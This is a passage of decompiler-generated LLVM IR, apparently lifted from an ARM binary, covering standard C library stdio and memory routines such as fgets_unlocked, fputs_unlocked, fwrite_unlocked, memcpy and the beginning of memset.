  store i1 %v2_1234c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1234c, label %.thread11, label %dec_label_pc_12354

dec_label_pc_12354:                               ; preds = %dec_label_pc_12348
  %v2_12358 = load i32, i32* @global_var_2b5b0.389, align 4
  store i32 %v2_12358, i32* %r3.global-to-local, align 4
  %v7_1235c = icmp eq i32 %v2_12358, 2
  store i1 %v7_1235c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1235c, label %dec_label_pc_12390, label %dec_label_pc_12364

dec_label_pc_12364:                               ; preds = %dec_label_pc_12354
  %v1_12364 = add i32 %v0_12364, 56
  store i32 %v1_12364, i32* @r4, align 4
  store i32 %v2_122a0, i32* @r0, align 4
  store i32 58060, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v1_12364, i32* @r2, align 4
  %v1_1237c = call i32 @__pthread_cleanup_push_defer()
  %v0_12380 = load i32, i32* @r4, align 4
  store i32 %v0_12380, i32* %r0.global-to-local, align 4
  store i32 62768, i32* %r3.global-to-local, align 4
  %v2_1238c = call i32 @pthread_mutex_lock(i32 %v0_12380)
  store i32 %v2_1238c, i32* %r0.global-to-local, align 4
  %v0_12390.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12390

dec_label_pc_12390:                               ; preds = %dec_label_pc_12354, %dec_label_pc_12364
  %v0_123a4 = phi i32 [ %v0_12364, %dec_label_pc_12354 ], [ %v0_12390.pre, %dec_label_pc_12364 ]
  %v1_12390 = inttoptr i32 %v0_123a4 to i32*
  %v2_12390 = load i32, i32* %v1_12390, align 4
  %v0_12394 = load i32, i32* @sl, align 4
  %v2_12394 = or i32 %v0_12394, %v2_12390
  %v1_12398 = xor i32 %v2_12394, 320
  store i32 %v1_12398, i32* %r3.global-to-local, align 4
  %v1_1239c = and i32 %v1_12398, 832
  %v2_1239c = icmp eq i32 %v1_1239c, 0
  store i1 %v2_1239c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1239c, label %dec_label_pc_123a4, label %bb39

dec_label_pc_123a4:                               ; preds = %dec_label_pc_12390
  store i32 %v0_123a4, i32* @r0, align 4
  %v0_123a8 = call i32 @__stdio_wcommit()
  store i32 %v0_123a8, i32* %r0.global-to-local, align 4
  %v2_123ac = icmp eq i32 %v0_123a8, 0
  store i1 %v2_123ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123ac, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_123a4
  %v1_123b0 = load i32, i32* @r6, align 4
  %v2_123b0 = inttoptr i32 %v1_123b0 to i32*
  %v3_123b0 = load i32, i32* %v2_123b0, align 4
  store i32 %v3_123b0, i32* %r3.global-to-local, align 4
  %v2_123b4 = add i32 %v1_123b0, 8
  %v3_123b4 = inttoptr i32 %v2_123b4 to i32*
  %v4_123b4 = load i32, i32* %v3_123b4, align 4
  %v2_123b8 = and i32 %v3_123b0, -65
  store i32 %v2_123b8, i32* %r3.global-to-local, align 4
  %v4_123bc = sdiv i32 %v3_123b0, 256
  store i32 %v4_123bc, i32* %r1.global-to-local, align 4
  %v3_123c0 = add i32 %v1_123b0, 28
  %v4_123c0 = inttoptr i32 %v3_123c0 to i32*
  store i32 %v4_123b4, i32* %v4_123c0, align 4
  %v1_123c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_123c4 = trunc i32 %v1_123c4 to i8
  %v3_123c4 = load i32, i32* @r6, align 4
  %v4_123c4 = add i32 %v3_123c4, 1
  %v5_123c4 = inttoptr i32 %v4_123c4 to i8*
  store i8 %v2_123c4, i8* %v5_123c4, align 1
  %v0_123c8.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_123c8.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_123c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_123c8 = trunc i32 %v1_123c8 to i8
  %v3_123c8 = load i32, i32* @r6, align 4
  %v4_123c8 = inttoptr i32 %v3_123c8 to i8*
  store i8 %v2_123c8, i8* %v4_123c8, align 1
  %v0_123cc.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_123cc.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_123a4, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_12390, %.thread6, %.thread7
  %v2_123d4 = load i32, i32* @global_var_2b5b0.389, align 4
  store i32 %v2_123d4, i32* %r3.global-to-local, align 4
  %v7_123d8 = icmp eq i32 %v2_123d4, 2
  store i1 %v7_123d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_123d8, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_122a0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 58236, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 58236)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_12348, %bb40
  %v0_123f0 = load i32, i32* @r6, align 4
  %v1_123f0 = add i32 %v0_123f0, 32
  %v2_123f0 = inttoptr i32 %v1_123f0 to i32*
  %v3_123f0 = load i32, i32* %v2_123f0, align 4
  store i32 %v3_123f0, i32* @r6, align 4
  %v2_123f4 = icmp eq i32 %v3_123f0, 0
  store i1 %v2_123f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123f4, label %dec_label_pc_123f4.dec_label_pc_123fc_crit_edge, label %dec_label_pc_12348

dec_label_pc_123f4.dec_label_pc_123fc_crit_edge:  ; preds = %.thread11
  %v0_123fc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_123fc

dec_label_pc_123fc:                               ; preds = %dec_label_pc_123f4.dec_label_pc_123fc_crit_edge, %dec_label_pc_122b8
  %v0_123fc = phi i32 [ %v0_123fc.pre, %dec_label_pc_123f4.dec_label_pc_123fc_crit_edge ], [ %v1_12338, %dec_label_pc_122b8 ]
  %v1_123fc = call i32 @_stdio_openlist_dec_use(i32 %v0_123fc)
  store i32 %v1_123fc, i32* %r0.global-to-local, align 4
  %v0_12440.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_12404:                               ; preds = %dec_label_pc_122ac
  %v1_12404 = inttoptr i32 %.v1_12298 to i8*
  %v2_12404 = load i8, i8* %v1_12404, align 1
  %v3_12404 = zext i8 %v2_12404 to i32
  %v1_12408 = and i32 %v3_12404, 64
  store i32 %v1_12408, i32* %r3.global-to-local, align 4
  %v2_12408 = icmp eq i32 %v1_12408, 0
  store i1 %v2_12408, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12408, label %bb41, label %dec_label_pc_12414

bb41:                                             ; preds = %dec_label_pc_12404
  br label %bb43

dec_label_pc_12414:                               ; preds = %dec_label_pc_12404
  %v0_12414 = call i32 @__stdio_wcommit()
  store i32 %v0_12414, i32* %r0.global-to-local, align 4
  %v2_12418 = icmp eq i32 %v0_12414, 0
  store i1 %v2_12418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12418, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_12414
  %v1_1241c = load i32, i32* @r8, align 4
  %v2_1241c = inttoptr i32 %v1_1241c to i32*
  %v3_1241c = load i32, i32* %v2_1241c, align 4
  store i32 %v3_1241c, i32* %r3.global-to-local, align 4
  %v2_12420 = add i32 %v1_1241c, 8
  %v3_12420 = inttoptr i32 %v2_12420 to i32*
  %v4_12420 = load i32, i32* %v3_12420, align 4
  store i32 %v4_12420, i32* %r1.global-to-local, align 4
  %v2_12424 = and i32 %v3_1241c, -65
  store i32 %v2_12424, i32* %r3.global-to-local, align 4
  %v4_12428 = sdiv i32 %v3_1241c, 256
  %v2_1242c = trunc i32 %v4_12428 to i8
  %v4_1242c = add i32 %v1_1241c, 1
  %v5_1242c = inttoptr i32 %v4_1242c to i8*
  store i8 %v2_1242c, i8* %v5_1242c, align 1
  %v0_12430.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12430.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_12430 = load i32, i32* %r1.global-to-local, align 4
  %v2_12430 = load i32, i32* @r8, align 4
  %v3_12430 = add i32 %v2_12430, 28
  %v4_12430 = inttoptr i32 %v3_12430 to i32*
  store i32 %v1_12430, i32* %v4_12430, align 4
  %v1_12434 = load i32, i32* %r3.global-to-local, align 4
  %v2_12434 = trunc i32 %v1_12434 to i8
  %v3_12434 = load i32, i32* @r8, align 4
  %v4_12434 = inttoptr i32 %v3_12434 to i8*
  store i8 %v2_12434, i8* %v4_12434, align 1
  %v0_12438.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12438.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_12414
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_123fc, %.thread20
  %v0_12440 = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_12440.pre, %dec_label_pc_123fc ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_12440, i32* %r0.global-to-local, align 4
  store i32 %v3_1228c, i32* @r4, align 4
  store i32 %v6_1228c, i32* @r5, align 4
  store i32 %v15_1228c, i32* @r8, align 4
  ret i32 %v0_12440

; uselistorder directives
  uselistorder i32 %v0_12440, { 1, 0 }
  uselistorder i32 %v3_123f0, { 1, 2, 0 }
  uselistorder i32 %v2_122a0, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 9, 2, 10, 4, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 12, 5, 7, 6, 8, 9, 10, 11, 0, 13, 14 }
  uselistorder i32* @global_var_2b5b0.389, { 1, 2, 3, 4, 0 }
  uselistorder i32* bitcast (i32** @global_var_2b57c.384 to i32*), { 4, 0, 5, 1, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_2b580.577 to i32), { 0, 3, 4, 1, 5, 6, 2, 7, 8 }
  uselistorder i32* @global_var_2deb0.561, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_2b598.559 to i32), { 0, 5, 6, 1, 7, 8, 2, 9, 10, 3, 11, 4, 12 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12390, { 1, 0 }
  uselistorder label %dec_label_pc_12348, { 1, 0 }
  uselistorder label %dec_label_pc_122b8, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12474 = icmp eq i32 %arg2, 0
  store i1 %v2_12474, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_124fc, label %dec_label_pc_124e0.preheader

dec_label_pc_124e0.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_124e015 = add i32 %arg2, -1
  store i32 %v1_124e015, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_124e021 = icmp eq i32 %arg2, 1
  store i1 %v7_124e021, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_124e021, label %dec_label_pc_124ec, label %dec_label_pc_1248c

dec_label_pc_1248c:                               ; preds = %dec_label_pc_124e0.preheader, %dec_label_pc_124e0.backedge
  %v1_124e424.in = phi i32 [ %v0_124e4.pre, %dec_label_pc_124e0.backedge ], [ %arg3, %dec_label_pc_124e0.preheader ]
  %v1_1248c = add i32 %v1_124e424.in, 16
  %v2_1248c = inttoptr i32 %v1_1248c to i32*
  %v3_1248c = load i32, i32* %v2_1248c, align 4
  store i32 %v3_1248c, i32* %r2.global-to-local, align 4
  %v1_12490 = add i32 %v1_124e424.in, 24
  %v2_12490 = inttoptr i32 %v1_12490 to i32*
  %v3_12490 = load i32, i32* %v2_12490, align 4
  %v3_12494 = icmp uge i32 %v3_1248c, %v3_12490
  store i1 %v3_12494, i1* %cpsr_c.global-to-local, align 1
  %v9_12494 = icmp eq i32 %v3_1248c, %v3_12490
  store i1 %v9_12494, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12494, label %dec_label_pc_124b4, label %dec_label_pc_1249c

dec_label_pc_1249c:                               ; preds = %dec_label_pc_1248c
  %v1_1249c = inttoptr i32 %v3_1248c to i8*
  %v2_1249c = load i8, i8* %v1_1249c, align 1
  %v5_1249c = add i32 %v3_1248c, 1
  store i32 %v5_1249c, i32* %r2.global-to-local, align 4
  %v2_124a0 = load i32, i32* @r4, align 4
  %v3_124a0 = inttoptr i32 %v2_124a0 to i8*
  store i8 %v2_1249c, i8* %v3_124a0, align 1
  %v0_124a4 = load i32, i32* @r4, align 4
  %v1_124a4 = inttoptr i32 %v0_124a4 to i8*
  %v2_124a4 = load i8, i8* %v1_124a4, align 1
  %v5_124a4 = add i32 %v0_124a4, 1
  store i32 %v5_124a4, i32* @r4, align 4
  %v2_124a8 = icmp ugt i8 %v2_124a4, 9
  store i1 %v2_124a8, i1* %cpsr_c.global-to-local, align 1
  %v7_124a8 = icmp eq i8 %v2_124a4, 10
  store i1 %v7_124a8, i1* %cpsr_z.global-to-local, align 1
  %v0_124ac = load i32, i32* %r2.global-to-local, align 4
  %v1_124ac = load i32, i32* @r5, align 4
  %v2_124ac = add i32 %v1_124ac, 16
  %v3_124ac = inttoptr i32 %v2_124ac to i32*
  store i32 %v0_124ac, i32* %v3_124ac, align 4
  br i1 %v7_124a8, label %dec_label_pc_124ec, label %dec_label_pc_124e0.backedge

dec_label_pc_124b4:                               ; preds = %dec_label_pc_1248c
  %v1_124e424 = inttoptr i32 %v1_124e424.in to i8*
  %v3_124b4 = call i32 @getc_unlocked(i8* %v1_124e424)
  %v4_124b4 = trunc i32 %v3_124b4 to i8
  %v5_124b8 = icmp eq i8 %v4_124b4, -1
  store i1 %v5_124b8, i1* %cpsr_c.global-to-local, align 1
  %v10_124b8 = icmp eq i32 %v3_124b4, -1
  store i1 %v10_124b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_124b8, label %dec_label_pc_124c0, label %dec_label_pc_124dc

dec_label_pc_124c0:                               ; preds = %dec_label_pc_124b4
  %v0_124c0 = load i32, i32* @r5, align 4
  %v1_124c0 = inttoptr i32 %v0_124c0 to i8*
  %v2_124c0 = load i8, i8* %v1_124c0, align 1
  %v1_124c4 = and i8 %v2_124c0, 8
  %v2_124c4 = icmp eq i8 %v1_124c4, 0
  store i1 %v2_124c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_124c4, label %dec_label_pc_124ec, label %dec_label_pc_124fc

dec_label_pc_124dc:                               ; preds = %dec_label_pc_124b4
  %v3_124d0 = load i32, i32* @r4, align 4
  %v4_124d0 = inttoptr i32 %v3_124d0 to i8*
  store i8 %v4_124b4, i8* %v4_124d0, align 1
  %v0_124d4 = load i32, i32* @r4, align 4
  %v1_124d4 = inttoptr i32 %v0_124d4 to i8*
  %v2_124d4 = load i8, i8* %v1_124d4, align 1
  %v5_124d4 = add i32 %v0_124d4, 1
  store i32 %v5_124d4, i32* @r4, align 4
  %v2_124d8 = icmp ugt i8 %v2_124d4, 9
  store i1 %v2_124d8, i1* %cpsr_c.global-to-local, align 1
  %v7_124d8 = icmp eq i8 %v2_124d4, 10
  store i1 %v7_124d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_124d8, label %dec_label_pc_124ec, label %dec_label_pc_124e0.backedge

dec_label_pc_124e0.backedge:                      ; preds = %dec_label_pc_124dc, %dec_label_pc_1249c
  %v0_124e0.pre = load i32, i32* @r6, align 4
  %v0_124e4.pre = load i32, i32* @r5, align 4
  %v1_124e0 = add i32 %v0_124e0.pre, -1
  store i32 %v1_124e0, i32* @r6, align 4
  %v2_124e0 = icmp ne i32 %v0_124e0.pre, 0
  store i1 %v2_124e0, i1* %cpsr_c.global-to-local, align 1
  %v7_124e0 = icmp eq i32 %v0_124e0.pre, 1
  store i1 %v7_124e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_124e0, label %dec_label_pc_124ec, label %dec_label_pc_1248c

dec_label_pc_124ec:                               ; preds = %dec_label_pc_124e0.preheader, %dec_label_pc_124dc, %dec_label_pc_124e0.backedge, %dec_label_pc_1249c, %dec_label_pc_124c0
  %v0_124ec = load i32, i32* @r4, align 4
  %v1_124ec = load i32, i32* %r7.global-to-local, align 4
  %v3_124ec = icmp uge i32 %v0_124ec, %v1_124ec
  store i1 %v3_124ec, i1* %cpsr_c.global-to-local, align 1
  %v9_124ec = icmp eq i32 %v0_124ec, %v1_124ec
  store i1 %v9_124ec, i1* %cpsr_z.global-to-local, align 1
  %v2_124f0 = xor i1 %v9_124ec, true
  %v3_124f0 = and i1 %v3_124ec, %v2_124f0
  br i1 %v3_124f0, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_124ec
  %v7_124f4 = inttoptr i32 %v0_124ec to i8*
  store i8 0, i8* %v7_124f4, align 1
  %v0_124f8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_124f8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_124ec, %bb
  %v1_124f8 = phi i1 [ %v1_124f8.pre, %bb ], [ %v9_124ec, %dec_label_pc_124ec ]
  %v0_124f8 = phi i1 [ %v0_124f8.pre, %bb ], [ %v3_124ec, %dec_label_pc_124ec ]
  %v2_124f8 = xor i1 %v1_124f8, true
  %v3_124f8 = and i1 %v0_124f8, %v2_124f8
  br i1 %v3_124f8, label %.dec_label_pc_12500_crit_edge, label %dec_label_pc_124fc

.dec_label_pc_12500_crit_edge:                    ; preds = %.thread7
  %v0_12500.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12500

dec_label_pc_124fc:                               ; preds = %entry, %dec_label_pc_124c0, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12500

dec_label_pc_12500:                               ; preds = %.dec_label_pc_12500_crit_edge, %dec_label_pc_124fc
  %v0_12500 = phi i32 [ %v0_12500.pre, %.dec_label_pc_12500_crit_edge ], [ 0, %dec_label_pc_124fc ]
  ret i32 %v0_12500

; uselistorder directives
  uselistorder i1 %v9_124ec, { 1, 0, 2 }
  uselistorder i32 %v1_124ec, { 1, 0 }
  uselistorder i32 %v0_124ec, { 0, 2, 1 }
  uselistorder i32 %v0_124e0.pre, { 2, 0, 1 }
  uselistorder i1 %v2_124c4, { 1, 0 }
  uselistorder i32 %v3_1248c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_124e424.in, { 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder label %dec_label_pc_12500, { 1, 0 }
  uselistorder label %dec_label_pc_124fc, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_124ec, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_1248c, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_12508 = load i32, i32* @r4, align 4
  store i32 %v3_12508, i32* %stack_var_-16, align 4
  %v6_12508 = load i32, i32* @r5, align 4
  %v9_12508 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_12514 = call i32 @strlen(i8* %arg1)
  store i32 %v3_12514, i32* @r6, align 4
  %v0_1251c = load i32, i32* @r5, align 4
  %v0_12520 = load i32, i32* @r4, align 4
  %v5_1252c = inttoptr i32 %v0_1251c to i8*
  %v6_1252c = call i32 @__GI_fwrite_unlocked(i32 %v0_12520, i32 1, i32 %v3_12514, i8* %v5_1252c)
  %v1_12530 = load i32, i32* @r6, align 4
  %v9_12530 = icmp eq i32 %v6_1252c, %v1_12530
  br i1 %v9_12530, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_12538 = phi i32 [ %v6_1252c, %entry ], [ -1, %bb ]
  %v2_12538 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12538, i32* @r4, align 4
  store i32 %v6_12508, i32* @r5, align 4
  store i32 %v9_12508, i32* @r6, align 4
  ret i32 %v14_12538

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_1253c = load i32, i32* @r6, align 4
  %v12_1253c = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_12544 = load i8, i8* %arg4, align 1
  %v4_12544 = zext i8 %v3_12544 to i32
  %v1_12548 = and i32 %v4_12544, 192
  store i32 %v1_12548, i32* %r3.global-to-local, align 4
  %v2_1254c = icmp eq i32 %v1_12548, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_1254c, label %dec_label_pc_12574, label %dec_label_pc_12568

dec_label_pc_12568:                               ; preds = %entry
  %v4_12568 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_1256c = icmp eq i32 %v4_12568, 0
  br i1 %v2_1256c, label %dec_label_pc_12568.dec_label_pc_12574_crit_edge, label %dec_label_pc_125dc

dec_label_pc_12568.dec_label_pc_12574_crit_edge:  ; preds = %dec_label_pc_12568
  %v0_12574.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12574

dec_label_pc_12574:                               ; preds = %dec_label_pc_12568.dec_label_pc_12574_crit_edge, %entry
  %v0_1257c1 = phi i32 [ %v0_12574.pre, %dec_label_pc_12568.dec_label_pc_12574_crit_edge ], [ %arg2, %entry ]
  %v2_12574 = icmp eq i32 %v0_1257c1, 0
  br i1 %v2_12574, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_12574
  br label %dec_label_pc_125dc

bb:                                               ; preds = %dec_label_pc_12574
  %v1_12578 = load i32, i32* @r6, align 4
  %v3_12578 = icmp eq i32 %v1_12578, 0
  br i1 %v3_12578, label %dec_label_pc_125dc, label %dec_label_pc_12588

dec_label_pc_12588:                               ; preds = %bb
  %v2_12588 = udiv i32 -1, %v0_1257c1
  %v0_12590 = load i32, i32* @r4, align 4
  store i32 %v0_12590, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_12578, %v2_12588
  br i1 %tmp10, label %dec_label_pc_125b4, label %dec_label_pc_1259c

dec_label_pc_1259c:                               ; preds = %dec_label_pc_12588
  %v0_12594 = load i32, i32* @r7, align 4
  %v2_1259c = mul i32 %v1_12578, %v0_1257c1
  %v4_125a0 = call i32 @__stdio_fwrite(i32 %v0_12594, i32 %v2_1259c, i32 %v0_12590)
  %v0_125a4 = load i32, i32* @r5, align 4
  %v2_125a8 = udiv i32 %v4_125a0, %v0_125a4
  store i32 %v2_125a8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_125e0

dec_label_pc_125b4:                               ; preds = %dec_label_pc_12588
  %v1_125b4 = inttoptr i32 %v0_12590 to i32*
  %v2_125b4 = load i32, i32* %v1_125b4, align 4
  %v1_125b8 = or i32 %v2_125b4, 8
  store i32 %v1_125b8, i32* %r3.global-to-local, align 4
  %v3_125bc = sdiv i32 %v2_125b4, 256
  store i32 %v3_125bc, i32* %r2.global-to-local, align 4
  %v1_125c0 = trunc i32 %v3_125bc to i8
  %v3_125c0 = add i32 %v0_12590, 1
  %v4_125c0 = inttoptr i32 %v3_125c0 to i8*
  store i8 %v1_125c0, i8* %v4_125c0, align 1
  %v0_125c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_125c4 = trunc i32 %v0_125c4 to i8
  %v2_125c4 = load i32, i32* @r4, align 4
  %v3_125c4 = inttoptr i32 %v2_125c4 to i8*
  store i8 %v1_125c4, i8* %v3_125c4, align 1
  %v0_125c8 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_125d4 = inttoptr i32 %v0_125c8 to i32*
  store i32 22, i32* %v2_125d4, align 4
  %v0_125e0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_125e0

dec_label_pc_125dc:                               ; preds = %.thread, %dec_label_pc_12568, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_125e0

dec_label_pc_125e0:                               ; preds = %dec_label_pc_125b4, %dec_label_pc_1259c, %dec_label_pc_125dc
  %v0_125e0 = phi i32 [ %v0_125e0.pre, %dec_label_pc_125b4 ], [ %v2_125a8, %dec_label_pc_1259c ], [ 0, %dec_label_pc_125dc ]
  store i32 %v9_1253c, i32* @r6, align 4
  store i32 %v12_1253c, i32* @r7, align 4
  ret i32 %v0_125e0

; uselistorder directives
  uselistorder i32 %v3_125bc, { 1, 0 }
  uselistorder i32 %v1_12578, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_125e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_125dc, { 2, 0, 1 }
}

define i32 @function_125e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_125e8:
  ret i32 %arg1
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_125fc = inttoptr i32 %arg2 to i8*
  %v3_125fc = call i32 @_memcpy(i8* %v2_125fc, i32 %arg1)
  ret i32 %v3_125fc
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_12600 = load i32, i32* @r0, align 4
  %v1_12600 = load i32, i32* @r1, align 4
  %v2_12600 = inttoptr i32 %v0_12600 to i8*
  %v3_12600 = call i32 @_memcpy(i8* %v2_12600, i32 %v1_12600)
  ret i32 %v3_12600
}

define i32 @__GI_memset() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v0_12610 = load i32, i32* @r0, align 4
  store i32 %v0_12610, i32* %r3.global-to-local, align 4
  %v0_12614 = load i32, i32* @r2, align 4
  %v8_12614 = icmp eq i32 %v0_12614, 8
  store i1 %v8_12614, i1* %cpsr_z.global-to-local, align 1
  %v5_12618 = icmp slt i32 %v0_12614, 8
  br i1 %v5_12618, label %dec_label_pc_12678, label %dec_label_pc_1261c

dec_label_pc_1261c:                               ; preds = %entry
  %v0_1261c = load i32, i32* @r1, align 4
  %v4_1261c = mul i32 %v0_1261c, 256
  %v5_1261c = or i32 %v4_1261c, %v0_1261c
  %v4_12620 = mul i32 %v5_1261c, 65536
  %v5_12620 = or i32 %v4_12620, %v5_1261c
  store i32 %v5_12620, i32* @r1, align 4
  %v1_1262457 = urem i32 %v0_12610, 4
  %v2_1262458 = icmp eq i32 %v1_1262457, 0
  store i1 %v2_1262458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %v0_1261c to i8
  br i1 %v2_1262458, label %dec_label_pc_12634, label %bb

bb:                                               ; preds = %dec_label_pc_1261c, %.thread.bb_crit_edge
  %v0_1261c.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1261c ]
  %v3_1262859 = phi i32 [ %v6_12628, %.thread.bb_crit_edge ], [ %v0_12610, %dec_label_pc_1261c ]
  %v4_12628 = inttoptr i32 %v3_1262859 to i8*
  store i8 %v0_1261c.sink.off0, i8* %v4_12628, align 1
  %v5_12628 = load i32, i32* %r3.global-to-local, align 4
  %v6_12628 = add i32 %v5_12628, 1
  store i32 %v6_12628, i32* %r3.global-to-local, align 4
  %v0_1262c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_12638.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1262c.pr, label %dec_label_pc_12634, label %.thread

.thread:                                          ; preds = %bb
